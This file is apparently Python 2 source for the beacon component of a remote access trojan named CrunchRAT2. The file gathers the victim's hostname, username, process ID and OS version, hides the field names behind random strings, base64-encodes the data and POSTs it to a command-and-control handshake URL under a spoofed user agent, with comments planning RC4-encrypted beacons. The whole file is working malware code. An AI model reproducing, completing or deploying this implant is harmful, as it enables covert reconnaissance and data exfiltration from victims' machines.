import base64, urllib, urllib2, json, getpass, os, platform, random, socket, string, sys, time


external_address = "127.0.0.1"
port = "80"
protocol = "http"
beacon_uri = "CrunchRAT2/Website/handshake.php"
user_agent = "USER_AGENT"
sleep_interval = 10
beacon_url = protocol + "://" + external_address + "/" + beacon_uri


def get_info_and_beacon():
    hostname_var = ''.join(random.choice(string.lowercase) for i in range(10))
    current_user_var = ''.join(random.choice(string.lowercase) for i in range(10))
    process_id_var = ''.join(random.choice(string.lowercase) for i in range(10))
    operating_system_var = ''.join(random.choice(string.lowercase) for i in range(10))

    if "Darwin" in platform.system():
        globals()[operating_system_var] = "Mac OS X " + platform.mac_ver()[0]
    else:
        globals()[operating_system_var] = platform.linux_distribution()[0] + " " + platform.linux_distribution()[1]

    globals()[hostname_var] = socket.gethostname()
    globals()[current_user_var] = getpass.getuser()
    globals()[process_id_var] = os.getpid()

    post_data = [(hostname_var, globals()[hostname_var]), 
        (current_user_var, globals()[current_user_var]),
        (process_id_var, globals()[process_id_var]),
        (operating_system_var, globals()[operating_system_var])]

    base64_encoded = base64.b64encode(urllib.urlencode(post_data))

    request = urllib2.Request(beacon_url, base64_encoded)
    request.add_header("User-Agent", user_agent)
    f = urllib2.urlopen(request)
    response = f.read()
    print response # DEBUGGING
    return response


if __name__ == "__main__":
    counter = 0

    # if counter = 0
    # do an initial beacon

    # else do an RC4 encrypted beacon
    get_info_and_beacon()
